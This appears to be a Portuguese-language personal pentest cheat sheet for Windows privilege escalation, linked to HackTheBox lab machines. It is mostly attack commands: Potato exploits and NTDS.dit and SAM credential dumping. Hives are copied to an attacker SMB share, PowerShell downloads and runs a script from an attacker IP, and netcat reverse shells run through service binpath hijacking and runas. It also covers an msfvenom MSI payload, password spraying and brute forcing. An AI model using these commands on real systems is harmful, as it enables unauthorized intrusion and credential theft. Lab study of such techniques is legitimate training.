# Windows PrivEsc

## Checklist

- [ ] [**Permissão do usuário**](#permissao%20de%20usuario)
- [ ] [**Navegar nos diretórios do usuário**](#navegacao-diretorios)
- [ ] [**WinPeas e PowerUp**](#winpeas-e-powerup)
- [ ] [**Senhas salvas no registro**](#credenciais-no-registro)
- [ ] [**Enumerar serviços locais/restritos**](#enumeracao-de-servicos)
- [ ] [**Enumerar scheduled tasks/tarefas agendadas**](#scheduled-tasks)
- [ ] [**Versão de kernel**](#versao-de-kernel)
- [ ] [**Reutilização de credenciais já obtidas**](#reuso-de-senha)
- [ ] [**Explorando Unquoted Service Path**](#unquoted-service-path)
- [ ] [**Enumeração de processos da máquina**](#enumeracao-de-processos)
- [ ] [**AlwaysInstallElevated**](#alwaysinstallelevated)
- [ ] [**Credenciais em cache**](#credenciais-em-cache)
- [ ] [**Enumerar dispositivos da máquina**](#enumerar-dispositivos-da-maquina)
- [ ] [**Enumerar senhas por meio de arquivos de configuração, anotações de usuários, etc...**](#enumeracao-de-senhas)
- [ ] [**Permissionamento de arquivos**](#permissionamento-de-arquivos-e-pastas)

Depois considerar esse link para verifcar uma ferramenta para obtenção de credencais em processos como firefox chrome e afins...

https://github.com/putterpanda/mimikittenz

<details markdown="1"><summary markdown="1">
## Permissão de usuário
</summary>

Aqui estamos a procura de permissões tais como:

SeImpersonate
SeDebug
SeBackup

Existem outros que podem ser explorados também, porém esses são o suficiente por enquanto:

**SeImpersonate**

```
whoami /priv
```

Aqui vale considerar os exploits Potatoes:

```
PrintSpoofer32.exe -i -c powershell
```

O exploit abaixo tem que considerar as portas abertas no firewall para ele funcionar adequadamente:

```
./jp.exe -t * -p c:\temp\s.bat [-l porta]
```
```
PrintSpoofer32.exe -i -c powershell

JuicyPotato.exe -t * -p shell.bat -l 4444

jp.exe -t * -p shell.bat -l 4444

whoami /all

SE IMPERSONATE
```
### Exemplos práticos

Vide máquina [Jeeves](../../../CTFs_Labs/HackTheBox/Jeeves#privilege-escalation)
Vide máquina [Bounty](../../../CTFs_Labs/HackTheBox/Bounty#privilege-escalation)


**LEMBRAR DE QUE AS PORTAS UTILIZADAS NO COMANDO DEVEM ESTAR LIBERADAS NO FIREWALL.**

Esse juicyPotato que funcionou é o que se encontra neste link:

[https://github.com/antonioCoco/JuicyPotatoNG/releases/download/v1.1/JuicyPotatoNG.zip](https://github.com/antonioCoco/JuicyPotatoNG/releases/download/v1.1/JuicyPotatoNG.zip)

**SeBackup**

Aqui podemos fazer uma cópia dos arquivos system e sam para a máquina do atacante para quebrar os hashes de senha ou utilizá-los para fazer os ataques pass the hash:

```
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system
```

**Observação de que no cenário de Domain Controller, temos de considerar a cópia do NTDS.DIT seguindo as seguintes etapas:**

Fazer um arquivo com o seguinte conteúdo:
```
set context persistent nowriters
add volume c: alias raj
create
expose %raj% z:
```
Antes de transferir o arquivo para a máquina alvo, precisamos fazer uma conversão para ficar tudo ok:

    unix2dos test.dsh

Se atentar somente ao diretório direitinho no qual se está operando: Baixar os arquivos system e ntds.dit para a máquina do atacante e executar o secretsdump localmente da seguinte maneira:

```
diskshadow /s test.dsh
robocopy /b z:\windows\ntds . ntds.dit
reg save hklm\system c:\Temp\system
```

Já na máquina do atacante, podemos executar o seguinte:

    impacket-secretsdump -ntds ntds.dit -system system local

Vide máquina [BlackField](../../../CTFs_Labs/HackTheBox/Blackfield#privesc)

</details>

<details markdown="1"><summary markdown="1">
## Navegação diretórios
</summary>

 Navegar nos diretorios do usuario para ver se existe algo ali que possa nos fornecer uma credencial ou algum bionario que inicie um servico/programa vulneravel a escalacao de privilegio

**Verificar se dentro do C:/ também existe algo.**

cmd

```
dir /s /b /a:-d-h \Users\usuario | findstr /i /v "appdata"
```
Mais abrangente:
```
cd c:\users
dir /s
```
```
cd c:/
dir
```

Powershell
```
gci 'c:\program files','c:\program files (x86)' | ft name, path, lastwritetime
```
Procurar por arquivos específicos
```
cd c:\users
cgi -recurse
```
Procurar por arquivos específicos
```
gci -recurse -filter <file_name> [-Path]
```
Procurar por programas instalados que sejam exploráveis
```
gci 'c:\program files','c:\program files (x86)' | ft name, path, lastwritetime
```
Exemplos:

![qownnotes-media-PvAXBV](../../../media/qownnotes-media-PvAXBV.png)

Exemplos que não são exploráveis:

![qownnotes-media-QpQnUo](../../../media/qownnotes-media-QpQnUo.png)

![qownnotes-media-vflhHT](../../../media/qownnotes-media-vflhHT.png)


Importante ressaltar que quando houver algum binário que vamos precisar fazer algum tipo de engenharia reversa, vamos considerar os seguintes cenários:

[.NET podemos utilizar o dnSpy](../../..)

### Exemplos práticos
Vide máquina [Bastion](../../../CTFs_Labs/HackTheBox/Bastion#privilege-escalation) : CVE de binário encontrado no c:/ da máquina.
Vide máquina [Buff](../../../CTFs_Labs/HackTheBox/Buff#privilege-escalation) : CVE exemplo de binário encontrado na pasta Downloads do usuário


</details>

<details markdown="1"><summary markdown="1">
## Winpeas e PowerUp
</summary>

Rodar um scan automatizado. Lembrando que esses scans são pegos por antivírus, então a abordagem manual sempre é mais interessantes em pentests de produção.
Verificar se existe algum servico disponivel para exploracao com permissoes demais. Aqui temos que usar o accesschk.

```
(new-object net.webclient).downloadfile('http://10.10.14.14/4-privilege%20escalation/winPEASx64.exe', 'c:\temp\w.exe')
./w.exe
```

```
(new-object net.webclient).downloadfile('http://10.10.14.14/4-privilege%20escalation/PowerUp.ps1', 'c:\temp\p.ps1')
. ./p.ps1]
invoke-allchecks
```
</details>

<details markdown="1"><summary markdown="1">
## Credenciais no registro
</summary>
```
reg query HKLM /f *password* /t REG_SZ /s

reg query HKLM /f teamviewer /t REG_SZ /s

reg query HKCU /f password /t REG_SZ /s
```

### Autologon

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

reg query HKLM\SOFTWARE\Wow6432Node\TeamViewer\Version7 /v SecurityPasswordAES

(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultUserName -ErrorAction SilentlyContinue).DefaultUserName   

(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword -ErrorAction SilentlyContinue).DefaultPassword   
```
Vide máquina [Chatterbox](../../../CTFs_Labs/HackTheBox/Chatterbox#privilege-escalation)
Vide máquina [Sauna](../../../CTFs_Labs/HackTheBox/Sauna#privilege-escalation)

</details>

<details markdown="1"><summary markdown="1">
## Enumeração de Serviços
</summary>

Checar os servicos que estao rodando na maquina para ver se temos permissao de alteracao em algum deles

A presença de interfaces virtuais pode aferir a ideia de existir máquinas virtuais na máquina ou de anti vírus instalado

Esse comando enumera as conexões e portas abertas, pelas quais são fornecidos os serviços de rede tais como banco de dados, aplicações web e/ou serviços que estajam vulneráveis a algum tipo de exploit público, por exemplo .
Pesquisando a respeito do serviço, podemos encontrar fragilidades que podemos explorar para escalar privilégios na máquina. Mas, claro, sempre visando serviços que rodam em modo system (que é nosso alvo)

    netstat -ano

O comando abaixo exige privilégio administrativo

    netstat -anb

Enumerando as interfaces de rede

    ipconfig /all
    route print

### Weak service permissions

![qownnotes-media-jCADRm](../../../media/qownnotes-media-jCADRm.png)

![qownnotes-media-Yhpwrk](../../../media/qownnotes-media-Yhpwrk.png)

    ./accesschk.exe -ucwqv UsoSvc /accepteula
    
    ./accesschk.exe -ucwqv <servicename> /accepteula

Com esse comando, verificamos que estamos no grupo NTAUTHORITY/SERVICE
    
    whoami /all

![qownnotes-media-zdSaRr](../../../media/qownnotes-media-zdSaRr.png)

    sc.exe config usosvc binpath="C:\temp\revshell.exe"

![qownnotes-media-QfiKZv](../../../media/qownnotes-media-QfiKZv.png)

    net stop usosvc
    net start usosvc

Vide máquina [Remote](../../../CTFs_Labs/HackTheBox/Remote#privilege-escalation)

</details>

<details markdown="1"><summary markdown="1">
## Scheduled Tasks
</summary>


```
schtasks /query /fo LIST /v

schtasks /query /fo LIST /v > schtasks.txt
copy schtasks.txt \\10.10.14.17\smb\scht.txt

dos2unix scht.txt
cat scht.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
```

![qownnotes-media-MkSFLk](../../../media/qownnotes-media-MkSFLk.png)

![qownnotes-media-eaAziX](../../../media/qownnotes-media-eaAziX.png)

![qownnotes-media-aeBsJo](../../../media/qownnotes-media-aeBsJo.png)

![qownnotes-media-bOauze](../../../media/qownnotes-media-bOauze.png)

Usando accesschk.exe

```
accesschk.exe /accepteula -quvw <username> <filename>
```

![qownnotes-media-JfEeCP](../../../media/qownnotes-media-JfEeCP.png)
</details>

<details markdown="1"><summary markdown="1">
## Versão de kernel
</summary>
https://github.com/SecWiki/windows-kernel-exploits

Se estiver com interface gráfica:

    winver
ou

    wmic os get Caption /value

ou

    ver

No powershell

    cmd /c ver

ou

    [System.Environment]::OSVersion

ou geralmente:

```
systeminfo > si.txt
copy si.txt \\10.10.14.17\smb\si.txt
```

Na máquina do atacante podemos utilizar o Windows Exploit suggester (wes):

### Windows Exploit Suggester

```
pip install wesng

sudo ln -s /home/acosta/.local/bin/wes /usr/bin/wes

wes --update
dos2unix si.txt
wes si.txt
```

**Não menos importante, podemos fazer pesquisas no google também**

Vide máquina Windows Server 2012 R2 [Optimum](../../../CTFs_Labs/HackTheBox/Optimum#privilege-escalation)
Vide máquina Windows Server 2008 R2 Build 7600 [Bastard](../../../CTFs_Labs/HackTheBox/Bastard#privesc)


</details>

<details markdown="1"><summary markdown="1">
## Reuso de senha
</summary>
```
$password = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('Administrator', $password)
Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5:8000/shell2.ps1')" -Credential $cred
```

Outra opção seria:

```
$username = "arkham\batman"
$password = "Zx^#QZX+T!123"
$secstr = New-Object -TypeName System.Security.SecureString
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
new-pssession -computername . -credential $cred
```
Ainda outra opção seria com runas:

```
runas /user:acosta ".\nc64.exe -e C:\windows\system32\cmd.exe 192.168.0.165 8083"
```
Existe um runas compilado que pode ser encontrado em:
https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip

```
.\runasCs.exe username password -r <IP_ATACANTE>:<porta_atacante> cmd
.\runasCs.exe username password -r <IP_ATACANTE>:<porta_atacante> powershell
```
### PasswordSpray

    kerbrute passwordspray -d test.local domain_users.txt password123

    awk {'print $1":"$1'} usuarios.txt > senhas.txt
    netexec smb 10.10.10.1 -u usuarios.txt -p senhas.txt --continue --no-bruteforce

### Bruteforce

    kerbrute bruteuser -d <dominio> --dc <endereco_ip> senhas.txt <usuario>


</details>

<details markdown="1"><summary markdown="1">
## Unquoted Service Path
</summary>
cmd

```
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
```
Podemos utilizar uma abordagem com o registro do Windows também:

    reg query HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\

Para ter um pouco mais de precisão, podemos utilizar findstr:

    reg query HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\ | findstr "<nome_do_serviço>"


Powershell

```
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
</details>

<details markdown="1"><summary markdown="1">
## Enumeração de processos
</summary>
```
get-process
wmic process
tasklist
tasklist /svc
tasklist /v /fi "username eq system"
Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
```

    Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name

</details>
<details markdown="1"><summary markdown="1">
## AlwaysInstallElevated
</summary>
```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
```

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP_Atacante> LPORT=<Porta> -a x64 --platform Windows -f msi -o bin.msi
```

Baixar para a máquina da vítima o ".msi"

    msi /i bin.msi
</details>

<details markdown="1"><summary markdown="1">
## Credenciais em cache
</summary>
```
cmdkey /list
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
runas /savecred /user:Administrator "cmd.exe /k whoami"
```
</details>

<details markdown="1"><summary markdown="1">
## Enumerar dispositivos da máquina
</summary>

```
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object Display Name, Start Mode, Path

Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer

Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
```
```
wmic logicaldisk get deviceid, volumename, description

#powershelll
powershell -c get-psdrive -psprovider filesystem

mountvol
```
Depois de enumerar, eh interessante montarmos o volume pra verificar se temos algo.

mountvol G: \\?\Volume{ff136f5c-4935-11e9-80b5-806e6f6e6963}\

    mountvol

Depois dee enumerar, eh interessante montarmos o volume pra verificar se temos algo.

    mountvol G: \\?\Volume{ff136f5c-4935-11e9-80b5-806e6f6e6963}\
</details>

<details markdown="1"><summary markdown="1">
## Enumeração de senhas
</summary>

Vale ressaltar que com o comando do findstr eu não tive sucesso na procura, porém, para algumas versões do Windows está funcional:


    findstr /si password *.doc *.txt *.ini *.config
    dir /s *pass* == *cred* == *ssh* == *.config*

**O comando abaixo foi o que funcionou para procurar strings via CMD**

    for /r %a in (\*.*) do find /i "password" %a
    
Powershell. Esse comando vale a pena procurar em locais específicos, porque ele trás um resultado bem grande...

    Get-ChildItem -recurse | Select-String -pattern "password"
    
No registro do Windows
    
    reg query HKLM /f *password* /t REG_SZ /s
    
    reg query HKLM /f teamviewer /t REG_SZ /s
    
    reg query HKCU /f password /t REG_SZ /s
    
</details>

<details markdown="1"><summary markdown="1">
## Permissionamento de arquivos e pastas
</summary>
```
(new-object net.webclient).downloadfile('http://10.10.14.17/4-privilege%20escalation/accesschk64.exe', 'c:\temp\a.exe')

.\a.exe -uwqs -accepteula Users c:\*.*
.\a.exe -uwqs -accepteula "Authenticated Users" c:\*.*

Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
```

Full name

```
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uws "Everyone" "C:\Program Files"
accesschk.exe -uwqs "Authenticated Users" c:\*.*
```
</details>

## Pontos de atenção

Aqui um ponto de atenção é que, caso não encontre nada na máquina, vale considerar que o serviço pelo qual entramos (geralmente web app), pode fornecer um ponto de entrada para a escalação de priilégio por meio da aplicação que está rodando no contexto system. às vezes a verificação ocorre por tentiva e erro mesmo.

Detalhe que daqui em diante, as enumerações são todas vistas nos processos automatizados. Então é bom não deixar de verificar este último ponto e um double check manual mesmo.






## Binary planting

```
sc config [service_name] binpath= "C:\temp\nc.exe -nv [RHOST] [RPORT] -e C:\WINDOWS\System32\cmd.exe"
sc config [service_name] obj= ".\LocalSystem" password= ""
sc qc [service_name] (to verify!)
net start [service_name]
```

Uma vez obtido system na máquina, é possível extrair a SAM da seguinte maneira:

por meio dos registros:

Na máquina vítima

```
reg save HKLM\SAM \\10.10.14.11\smb\sam
reg save HKLM\SYSTEM \\10.10.14.11\smb\system
```

Na máquina atacante:

```
impacket-secretsdump -sam sam -system system local
```

Acessando diretamente a o hard drive da máquina:

```
sudo guestmount --add '/tmp/smb/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd' --inspector --ro -v /mnt/vhd

cp vhd/Windows/System32/config/SAM /home/acosta/Downloads
cp vhd/Windows/System32/config/SYSTEM /home/acosta/Downloads
impacket-secretsdump -sam SAM -system SYSTEM local
```

ou até mesmo fazendo o port forwarding

## Enumeração de regras de firewall

    netsh advfirewall show currentprofile
    
    netsh advfirewall firewall show rule name=all
    
     Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name


## Writable files
 
     Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
